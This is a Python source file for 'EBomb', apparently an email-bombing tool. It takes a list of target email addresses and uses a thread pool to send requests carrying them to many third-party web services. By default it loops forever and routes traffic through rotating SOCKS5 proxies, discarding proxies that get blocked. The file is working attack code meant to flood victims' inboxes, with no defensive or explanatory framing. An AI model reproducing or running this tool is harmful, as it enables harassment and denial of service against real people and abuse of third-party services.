import sys
from multiprocessing.pool import ThreadPool

from EasyProxies import Proxies
from requests.exceptions import RequestException

from EBomb.services import *

__all__ = ('EBomb', 'Service', 'services')


class EBomb:
    def __init__(self, targets: list[str], threads_count: int = None, proxy: bool = True, forever: bool = True,
                 verbose: bool = True):
        not_verbose = not verbose
        if not_verbose: sys.stderr = sys.stdout = open('nul', 'w')
        self._not_verbose = not_verbose

        self.targets = [j for j in [str(i).strip() for i in targets] if j]
        if not targets: return
        self.forever = forever
        self._max_netloc_len = max(len(serv.netloc or '') for serv in services)
        self._max_email_len = max(len(e) for e in targets)
        self.__proxies = Proxies.get(limit=20, type='socks5') if proxy else []
        self.proxy = proxy
        self.start(threads_count)

    @property
    def proxies(self):
        if self.proxy and not self.__proxies:
            self.__proxies += Proxies.get(limit=20, type='socks5')
        return self.__proxies

    def start(self, threads_count: int):
        print(f"Services: {len(services)}\n"
              f"Proxy: {self.proxy}\n"
              f"Emails: {'; '.join(f'{i!r}' for i in self.targets)}\n"
              f"{'HOST'.center(self._max_netloc_len)} / METH | {'EMAIL'.center(self._max_email_len)}"
              f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE")
        args = [(service, email) for email in self.targets for service in services]

        def _starter():
            with ThreadPool(threads_count) as pool:
                pool.starmap(self.request, args)

        if self.forever:
            while True:
                _starter()
        else:
            _starter()

    def request(self, service: Service, email: str):
        proxies = self.proxies
        _proxy = sorted(proxies)[0] if self.proxy else None
        try:
            resp = service.request(email, proxies=_proxy)
            code = resp.status_code
        except RequestException as Error:
            resp = Error
            code = None
        print(
            f'{service.netloc:^{self._max_netloc_len}} / {service.method:<4}'
            f' | {email:^{self._max_email_len}}{f" | {str(_proxy):^22}" if _proxy else ""} | {resp}')
        if _proxy in proxies and code in (None, 401, 403, 407):
            proxies.remove(_proxy)

    def __del__(self):
        if self._not_verbose:
            sys.stdout = sys.__stdout__
            sys.stderr = sys.__stderr__
